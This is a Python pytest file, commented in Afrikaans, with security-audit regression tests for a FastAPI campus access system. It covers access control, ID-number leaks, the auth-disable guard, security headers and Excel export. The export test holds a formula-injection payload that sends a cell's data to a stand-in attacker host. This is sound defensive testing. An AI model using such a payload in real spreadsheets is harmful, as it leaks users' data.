"""Regressietoetse vir die sekuriteitsoudit (MOON-SEC-*).

Hierdie toetse gebruik die regte JWT-aanmelding (geen oorskrywing van
get_current_user nie), sodat hulle die toegangsbeheer self toets.
"""

from datetime import timedelta

import pytest
from fastapi import FastAPI
from fastapi.testclient import TestClient
from sqlalchemy import create_engine, event
from sqlalchemy.orm import sessionmaker
from sqlalchemy.pool import StaticPool

import auth
import database
import models
from routers import auth_routes, events, gebruikers, kampus, klasse, koshuis, lokasie, saamry, student, wagte


@pytest.fixture()
def omg():
    engine = create_engine(
        "sqlite://", connect_args={"check_same_thread": False}, poolclass=StaticPool
    )

    @event.listens_for(engine, "connect")
    def _char_length(dbapi_conn, _):
        dbapi_conn.create_function("char_length", 1, lambda s: None if s is None else len(s))

    database.Base.metadata.create_all(bind=engine)
    Sessie = sessionmaker(bind=engine)
    db = Sessie()

    from starlette.middleware.sessions import SessionMiddleware

    app = FastAPI()
    app.add_middleware(SessionMiddleware, secret_key="toets")
    for r in (kampus, koshuis, lokasie, student, klasse, gebruikers, saamry, events, wagte, auth_routes):
        app.include_router(r.router)

    def _get_db():
        s = Sessie()
        try:
            yield s
        finally:
            s.close()

    app.dependency_overrides[database.get_db] = _get_db

    class Omgewing:
        pass

    o = Omgewing()
    o.db = db
    o.client = TestClient(app)
    o._teller = 0

    def gebruiker(rol: str | None):
        o._teller += 1
        rol_id = None
        if rol:
            r = db.query(models.Rolle).filter_by(ROL_Naam=rol).first()
            if r is None:
                r = models.Rolle(ROL_Naam=rol)
                db.add(r)
                db.flush()
            rol_id = r.Rol_ID
        u = models.Gebruikers(
            GEB_Naam="Toets", GEB_Van=f"Sek{o._teller}",
            GEB_ID_Nommer=f"{9001010000000 + o._teller}", GEB_Epos=f"sek{o._teller}@example.com",
            GEB_Wagwoord="x", Rol_ID=rol_id, Is_Aktief=True,
        )
        db.add(u)
        db.commit()
        token = auth.create_access_token({"sub": str(u.Gebruiker_ID)}, timedelta(minutes=5))
        return u, {"Authorization": f"Bearer {token}"}

    o.gebruiker = gebruiker
    kampus_rec = models.Kampus(KAM_Naam="Pretoria", KAM_Adres="x")
    db.add(kampus_rec)
    db.flush()
    o.kampus_id = kampus_rec.Kampus_ID
    kos = models.Koshuis(KOS_Naam="Huis", KOS_Adres="x", KOS_Kapasiteit=10, Kampus_ID=kampus_rec.Kampus_ID)
    db.add(kos)
    db.commit()
    o.koshuis_id = kos.Koshuis_ID

    yield o
    db.close()


# --- MOON-SEC-003: status-endpoints met persoonlike data ---------------------

def test_sec003_status_vereis_aanmelding(omg):
    for pad in ("/kampusse/status", f"/kampusse/{omg.kampus_id}/status", f"/koshuise/{omg.koshuis_id}/status"):
        assert omg.client.get(pad).status_code == 401, pad


@pytest.mark.parametrize("rol", ["Student", "Personeel"])
def test_sec003_detail_status_geweier_vir_studente_en_personeel(omg, rol):
    _, kop = omg.gebruiker(rol)
    assert omg.client.get(f"/kampusse/{omg.kampus_id}/status", headers=kop).status_code == 403
    assert omg.client.get(f"/koshuise/{omg.koshuis_id}/status", headers=kop).status_code == 403


@pytest.mark.parametrize("rol", ["Administrateur", "Kampus_Opsigter", "Sekuriteit_Wag"])
def test_sec003_detail_status_toegelaat_vir_sekuriteitsrolle(omg, rol):
    _, kop = omg.gebruiker(rol)
    assert omg.client.get(f"/kampusse/{omg.kampus_id}/status", headers=kop).status_code == 200
    assert omg.client.get(f"/koshuise/{omg.koshuis_id}/status", headers=kop).status_code == 200


def test_sec003_opsomming_slegs_getalle_vir_enige_aangemelde_gebruiker(omg):
    # Die tuisblad wys die opsomming vir alle personeel; dit bevat geen name nie.
    _, kop = omg.gebruiker("Personeel")
    r = omg.client.get("/kampusse/status", headers=kop)
    assert r.status_code == 200
    for item in r.json()["data"]:
        assert set(item) == {"Kampus_ID", "KAM_Naam", "KAM_Adres", "scanned_in_count", "scanned_out_count"}


# --- MOON-SEC-007: outo-uitcheck tydens 'n noodgeval --------------------------

def _sa(uur, minuut, dag=12):
    from zoneinfo import ZoneInfo
    from datetime import datetime as dt
    return dt(2026, 10, dag, uur, minuut, tzinfo=ZoneInfo("Africa/Johannesburg"))


def _utc_naief(sa_tyd):
    from datetime import timezone
    return sa_tyd.astimezone(timezone.utc).replace(tzinfo=None)


@pytest.fixture()
def uitcheck(omg, monkeypatch):
    import auto_uitcheck
    from datetime import datetime as dt

    Sessie = sessionmaker(bind=omg.db.get_bind())
    monkeypatch.setattr(auto_uitcheck.database, "SessionLocal", Sessie)
    monkeypatch.setattr(auto_uitcheck, "_laaste_uitgestel", 0, raising=False)

    class Klok(dt):
        nou = None

        @classmethod
        def now(cls, tz=None):
            return cls.nou.astimezone(tz) if tz else cls.nou

    monkeypatch.setattr(auto_uitcheck, "datetime", Klok)
    db = omg.db
    tweede = models.Kampus(KAM_Naam="Kaapstad", KAM_Adres="x")
    db.add(tweede)
    db.flush()
    hekke = {}
    for kid in (omg.kampus_id, tweede.Kampus_ID):
        hek = models.Lokasie(LOK_Naam=f"Hek{kid}", LOK_Tipe="Kampus", Kampus_ID=kid)
        db.add(hek)
        db.flush()
        hekke[kid] = hek.Lokasie_ID
    db.commit()

    class U:
        pass

    u = U()
    u.db, u.hekke, u.kampus_a, u.kampus_b = db, hekke, omg.kampus_id, tweede.Kampus_ID

    def student_in(kampus_id, sa_tyd):
        g, _ = omg.gebruiker("Student")
        db.add(models.Student(Gebruiker_ID=g.Gebruiker_ID, STU_Nommer=f"S{g.Gebruiker_ID}", STU_Is_Koshuis=False))
        db.add(models.ToegangsLogs(Gebruiker_ID=g.Gebruiker_ID, Lokasie_ID=hekke[kampus_id],
                                   TOE_Rigting="IN", TOE_Metode="NFC", TOE_Tydstempel=_utc_naief(sa_tyd)))
        db.commit()
        return g.Gebruiker_ID

    def noodgeval(kampus_id):
        skepper, _ = omg.gebruiker("Administrateur")
        n = models.Noodgeval(Kampus_ID=kampus_id, Geskep_Deur_ID=skepper.Gebruiker_ID, NOO_Titel="Brand",
                             NOO_Boodskap="Ontruim", NOO_Status="AKTIEF", NOO_Boodskap_ID=f"n{kampus_id}")
        db.add(n)
        db.commit()
        return n

    def loop(sa_tyd):
        Klok.nou = sa_tyd
        auto_uitcheck.outo_uitcheck_job()
        db.expire_all()
        return {
            g for (g,) in db.query(models.ToegangsLogs.Gebruiker_ID)
            .filter(models.ToegangsLogs.TOE_Auto_Uitgecheck.is_(True))
        }

    u.student_in, u.noodgeval, u.loop = student_in, noodgeval, loop
    return u


def test_sec007_geen_uitcheck_op_kampus_met_aktiewe_noodgeval(uitcheck):
    a = uitcheck.student_in(uitcheck.kampus_a, _sa(8, 0))
    b = uitcheck.student_in(uitcheck.kampus_b, _sa(8, 0))
    nood = uitcheck.noodgeval(uitcheck.kampus_a)

    assert uitcheck.loop(_sa(22, 0)) == {b}           # net die kampus sonder noodgeval

    nood.NOO_Status = "GESLUIT"
    uitcheck.db.commit()
    assert uitcheck.loop(_sa(22, 30)) == {a, b}       # haal in sodra die noodgeval verby is


def test_sec007_haal_in_na_gemiste_minuut_en_nie_voor_afsnytyd_nie(uitcheck):
    s = uitcheck.student_in(uitcheck.kampus_b, _sa(9, 0))
    assert uitcheck.loop(_sa(21, 59)) == set()        # nog nie tyd nie
    assert uitcheck.loop(_sa(23, 17)) == {s}          # 22:00 gemis (bv. herbegin) — steeds uitgecheck
    assert uitcheck.loop(_sa(23, 18)) == {s}          # geen tweede UIT-log nie
    assert uitcheck.db.query(models.ToegangsLogs).filter_by(TOE_Auto_Uitgecheck=True).count() == 1


def test_sec007_in_na_afsnytyd_bly_tot_volgende_dag(uitcheck):
    s = uitcheck.student_in(uitcheck.kampus_b, _sa(22, 30))
    assert uitcheck.loop(_sa(22, 45)) == set()
    assert uitcheck.loop(_sa(22, 0, dag=13)) == {s}


# --- MOON-SEC-006: klasbywoning sonder roosterklas ----------------------------

@pytest.fixture()
def klas(omg, monkeypatch):
    from datetime import datetime as dt
    from zoneinfo import ZoneInfo

    db = omg.db
    lokale = {}
    for naam in ("L1", "L2"):
        lok = models.Lokasie(LOK_Naam=naam, LOK_Tipe="Klaskamer", Kampus_ID=omg.kampus_id)
        db.add(lok)
        db.flush()
        db.add(models.NFC_Tags(NFC_UID=f"UID-{naam}", Lokasie_ID=lok.Lokasie_ID, NFC_Tipe="Lokasie", NFC_Is_Aktief=True))
        lokale[naam] = lok
    mod = models.Module(MOD_Kode="SEK101")
    db.add(mod)
    db.flush()
    # Maandag 08:00–09:00 in L1.
    db.add(models.Klas(Module_ID=mod.Module_ID, Lokasie_ID=lokale["L1"].Lokasie_ID, KLA_Lokaal="L1",
                       KLA_Dag="Maandag", KLA_Begin_Tyd="08:00", KLA_Eind_Tyd="09:00"))
    stud, kop = omg.gebruiker("Student")
    db.add(models.Student(Gebruiker_ID=stud.Gebruiker_ID, STU_Nommer="S900", STU_Is_Koshuis=False))
    db.add(models.Student_Module(Gebruiker_ID=stud.Gebruiker_ID, Module_ID=mod.Module_ID))
    db.commit()

    class Klok(dt):
        nou = dt(2026, 10, 12, 8, 30, tzinfo=ZoneInfo("Africa/Johannesburg"))  # Maandag

        @classmethod
        def now(cls, tz=None):
            return cls.nou.astimezone(tz) if tz else cls.nou

    monkeypatch.setattr(klasse, "datetime", Klok)

    class K:
        pass

    k = K()
    k.kop, k.klok, k.db, k.stud = kop, Klok, db, stud

    def skandeer(uid):
        return omg.client.post("/student/scan-klas", json={"nfc_uid": uid, "rigting": "IN"}, headers=kop)

    def logs():
        return db.query(models.ToegangsLogs).filter_by(Gebruiker_ID=stud.Gebruiker_ID).count()

    k.skandeer, k.logs = skandeer, logs
    return k


def test_sec006_skandering_tydens_klas_in_regte_lokaal_tel(klas):
    r = klas.skandeer("UID-L1")
    assert r.status_code == 200, r.text
    assert klas.logs() == 1


def test_sec006_skandering_buite_klastyd_word_geweier(klas):
    from datetime import datetime as dt
    from zoneinfo import ZoneInfo
    klas.klok.nou = dt(2026, 10, 12, 3, 0, tzinfo=ZoneInfo("Africa/Johannesburg"))  # 03:00 vanuit die bed
    assert klas.skandeer("UID-L1").status_code == 409
    assert klas.logs() == 0


def test_sec006_skandering_in_verkeerde_lokaal_word_geweier(klas):
    assert klas.skandeer("UID-L2").status_code == 409
    assert klas.logs() == 0


@pytest.mark.parametrize("pad", ["/lokasies", "/klasse", "/klasse/1/roster", "/klasse/1/bywoning"])
def test_sec006_nfc_uids_en_klaslyste_nie_vir_studente_nie(omg, klas, pad):
    assert omg.client.get(pad, headers=klas.kop).status_code == 403
    _, opsigter = omg.gebruiker("Kampus_Opsigter")
    assert omg.client.get(pad, headers=opsigter).status_code == 200


# --- ID-nommer-lekke (POPIA; nie in die verslag nie) --------------------------

def test_saamry_soektog_vind_nie_mense_op_id_nommer_nie(omg):
    a, kop_a = omg.gebruiker("Student")
    b, _ = omg.gebruiker("Student")
    b.GEB_Naam, b.GEB_ID_Nommer = "Zandile", "0203045800081"
    for g in (a, b):
        omg.db.add(models.Student(Gebruiker_ID=g.Gebruiker_ID, STU_Nommer=f"ST{g.Gebruiker_ID}", STU_Is_Koshuis=False))
    omg.db.commit()

    def ids(q):
        r = omg.client.get("/saamry/gebruikers/search", params={"q": q}, headers=kop_a)
        assert r.status_code == 200, r.text
        return {u["gebruiker_id"] for u in r.json()["data"]}

    assert b.Gebruiker_ID not in ids("02030458")      # deel van die ID-nommer
    assert b.Gebruiker_ID in ids("Zandile")           # soek op naam werk steeds


def test_wag_kry_nie_id_nommers_uit_gebruikerslys_nie(omg):
    teiken, _ = omg.gebruiker("Student")
    _, wag = omg.gebruiker("Sekuriteit_Wag")
    lys = omg.client.get("/gebruikers", headers=wag)
    assert lys.status_code == 200
    assert lys.json()["data"] and all("GEB_ID_Nommer" not in g for g in lys.json()["data"])
    een = omg.client.get(f"/gebruikers/{teiken.Gebruiker_ID}", headers=wag)
    assert een.status_code == 200 and "GEB_ID_Nommer" not in een.json()["data"]


def test_opsigter_sonder_kampus_kry_403_nie_500_nie(omg):
    teiken, _ = omg.gebruiker("Student")
    _, opsigter = omg.gebruiker("Kampus_Opsigter")
    assert omg.client.get(f"/gebruikers/{teiken.Gebruiker_ID}", headers=opsigter).status_code == 403


# --- MOON-SEC-008: opsigters net vir hul eie kampus ---------------------------

@pytest.fixture()
def kampusse(omg):
    from datetime import datetime as dt
    db = omg.db
    ander = models.Kampus(KAM_Naam="Kaapstad", KAM_Adres="x")
    db.add(ander)
    db.flush()

    def opsigter(kampus_id):
        g, kop = omg.gebruiker("Kampus_Opsigter")
        db.add(models.Kampus_Opsigter(Gebruiker_ID=g.Gebruiker_ID, KAMO_Nommer=f"K{g.Gebruiker_ID}", Kampus_ID=kampus_id))
        db.commit()
        return kop

    def geleentheid(kampus_id):
        skepper, _ = omg.gebruiker("Administrateur")
        e = models.Funksie(Kampus_ID=kampus_id, Geskep_Deur_ID=skepper.Gebruiker_ID, FUN_Naam="Fees",
                           FUN_Begin_Tyd=dt(2026, 11, 1, 10), FUN_Eind_Tyd=dt(2026, 11, 1, 12),
                           FUN_Kapasiteit=50, FUN_Status="AKTIEF", FUN_Is_Aktief=True)
        db.add(e)
        db.commit()
        return e.Funksie_ID

    class K:
        pass

    k = K()
    k.eie, k.ander, k.opsigter, k.geleentheid = omg.kampus_id, ander.Kampus_ID, opsigter, geleentheid
    return k


def _geleentheid_roetes(eid):
    return [
        ("put", f"/events/{eid}", {"naam": "Gekaap"}),
        ("post", f"/events/{eid}/kanselleer", None),
        ("post", f"/events/{eid}/share", None),
        ("get", f"/events/{eid}/rsvps", None),
        ("get", f"/events/{eid}/attendance", None),
        ("delete", f"/events/{eid}/public-rsvps/999", None),
    ]


def test_sec008_opsigter_kan_nie_ander_kampus_se_geleenthede_bestuur_nie(omg, kampusse):
    kop = kampusse.opsigter(kampusse.eie)
    eid = kampusse.geleentheid(kampusse.ander)
    for metode, pad, body in _geleentheid_roetes(eid):
        r = getattr(omg.client, metode)(pad, headers=kop, **({"json": body} if body else {}))
        assert r.status_code == 403, (metode, pad, r.status_code)
    nuut = {"naam": "X", "kampus_id": kampusse.ander, "begin_tyd": "2026-11-02T10:00:00Z",
            "eind_tyd": "2026-11-02T12:00:00Z", "kapasiteit": 10}
    assert omg.client.post("/events", json=nuut, headers=kop).status_code == 403


def test_sec008_opsigter_bestuur_eie_kampus_en_kan_nie_na_ander_kampus_skuif_nie(omg, kampusse):
    kop = kampusse.opsigter(kampusse.eie)
    eid = kampusse.geleentheid(kampusse.eie)
    assert omg.client.get(f"/events/{eid}/rsvps", headers=kop).status_code == 200
    assert omg.client.put(f"/events/{eid}", json={"naam": "Nuwe naam"}, headers=kop).status_code == 200
    assert omg.client.put(f"/events/{eid}", json={"kampus_id": kampusse.ander}, headers=kop).status_code == 403


def test_sec008_admin_bestuur_enige_kampus(omg, kampusse):
    _, admin = omg.gebruiker("Administrateur")
    eid = kampusse.geleentheid(kampusse.ander)
    assert omg.client.get(f"/events/{eid}/rsvps", headers=admin).status_code == 200


def test_sec008_opsigter_sien_net_eie_kampus_se_besoekers(omg, kampusse):
    kop = kampusse.opsigter(kampusse.eie)
    assert omg.client.get(f"/opsigter/kampusse/{kampusse.ander}/besoekers", headers=kop).status_code == 403
    assert omg.client.get(f"/opsigter/kampusse/{kampusse.eie}/besoekers", headers=kop).status_code == 200


# --- MOON-SEC-001: DISABLE_AUTH net in ontwikkeling --------------------------

def _laai_auth(env_extra):
    import os
    import subprocess
    import sys
    from pathlib import Path
    env = {k: v for k, v in os.environ.items() if k not in ("DISABLE_AUTH", "ENVIRONMENT")}
    env.update({"SECRET_KEY": "toets-sleutel-" + "x" * 40, **env_extra})
    return subprocess.run([sys.executable, "-c", "import auth"], cwd=Path(auth.__file__).parent,
                          env=env, capture_output=True, text=True)


@pytest.mark.parametrize("omgewing", [None, "production", "prod", "staging"])
def test_sec001_disable_auth_weier_buite_ontwikkeling(omgewing):
    extra = {"DISABLE_AUTH": "1"}
    if omgewing:
        extra["ENVIRONMENT"] = omgewing
    r = _laai_auth(extra)
    assert r.returncode != 0 and "DISABLE_AUTH" in r.stderr


def test_sec001_disable_auth_toegelaat_in_ontwikkeling_en_af_in_produksie():
    assert _laai_auth({"DISABLE_AUTH": "1", "ENVIRONMENT": "development"}).returncode == 0
    assert _laai_auth({"DISABLE_AUTH": "0", "ENVIRONMENT": "production"}).returncode == 0


# --- MOON-SEC-016: aanmelding lek nie wie bestaan nie -------------------------

def test_sec016_onbekende_gebruiker_doen_ook_bcrypt(omg, monkeypatch):
    oproepe = []
    werklik = auth.bcrypt.checkpw
    monkeypatch.setattr(auth.bcrypt, "checkpw", lambda *a: oproepe.append(1) or werklik(*a))
    r = omg.client.post("/token", data={"username": "bestaan.nie@example.com", "password": "raai"})
    assert r.status_code == 401
    assert len(oproepe) == 1   # dieselfde werk as vir 'n bestaande gebruiker met 'n verkeerde wagwoord


def test_sec016_regte_wagwoord_meld_steeds_aan(omg):
    g, _ = omg.gebruiker("Administrateur")
    g.GEB_Wagwoord = auth.get_password_hash("korrek123")
    omg.db.commit()
    assert omg.client.post("/token", data={"username": g.GEB_Epos, "password": "korrek123"}).status_code == 200
    assert omg.client.post("/token", data={"username": g.GEB_Epos, "password": "verkeerd"}).status_code == 401


# --- MOON-SEC-017 / 018: /docs en sekuriteitsopskrifte ------------------------

def test_sec017_geen_api_dokumentasie_in_produksie(monkeypatch):
    import http_sekuriteit
    monkeypatch.setenv("ENVIRONMENT", "production")
    assert set(http_sekuriteit.dokumentasie_urls().values()) == {None}
    monkeypatch.setenv("ENVIRONMENT", "development")
    assert http_sekuriteit.dokumentasie_urls()["docs_url"] == "/docs"


@pytest.mark.parametrize("omgewing,hsts", [("production", True), ("development", False)])
def test_sec018_sekuriteitsopskrifte(monkeypatch, omgewing, hsts):
    import http_sekuriteit
    monkeypatch.setenv("ENVIRONMENT", omgewing)
    app = FastAPI()
    app.middleware("http")(http_sekuriteit.voeg_sekuriteitsopskrifte_by)
    app.get("/")(lambda: {"ok": True})
    r = TestClient(app).get("/")
    assert r.headers["X-Content-Type-Options"] == "nosniff"
    assert r.headers["X-Frame-Options"] == "DENY"
    assert r.headers["Referrer-Policy"] == "strict-origin-when-cross-origin"
    assert ("Strict-Transport-Security" in r.headers) is hsts


def test_sec017_018_main_gebruik_die_instellings():
    # main.py kan nie sonder 'n databasis gelaai word nie; kontroleer die bedrading.
    from pathlib import Path
    bron = (Path(auth.__file__).parent / "main.py").read_text(encoding="utf-8")
    assert "**http_sekuriteit.dokumentasie_urls()" in bron
    assert 'app.middleware("http")(http_sekuriteit.voeg_sekuriteitsopskrifte_by)' in bron


# --- MOON-SEC-010: geen formules in Excel-verslae nie -------------------------

def test_sec010_xlsx_skryf_formule_as_teks():
    import io
    from datetime import date, datetime as dt
    from openpyxl import load_workbook
    from services.verslag_formate import skryf_xlsx
    from services.verslag_service import GETAL, TEKS

    kwaad = '=HYPERLINK("http://aanvaller.example/?d="&A1,"Klik")'
    oorsig = {
        "titel": "Bywoning",
        "meta": {"omvang": "Kampus", "van": date(2026, 10, 1), "tot": date(2026, 10, 7), "werksdae": 5,
                 "gegenereer_op": dt(2026, 10, 12, 9, 0), "gegenereer_deur": "Toets", "rol": "Admin"},
        "afdelings": [{
            "titel": "Gaste", "beskrywing": "x", "kernsyfers": [], "insigte": [], "grafieke": [],
            "tabelle": [{"titel": "Gaste", "totaal": 1,
                         "kolomme": [{"naam": "Naam", "formaat": TEKS}, {"naam": "Aantal", "formaat": GETAL}],
                         "rye": [[kwaad, 3]]}],
        }],
    }
    wb = load_workbook(io.BytesIO(skryf_xlsx(oorsig)))
    selle = [c for ws in wb.worksheets for r in ws.iter_rows() for c in r if c.value == kwaad]
    assert selle, "die waarde moet steeds sigbaar wees"
    assert all(c.data_type == "s" for c in selle)
    assert not any(c.data_type == "f" for ws in wb.worksheets for r in ws.iter_rows() for c in r)
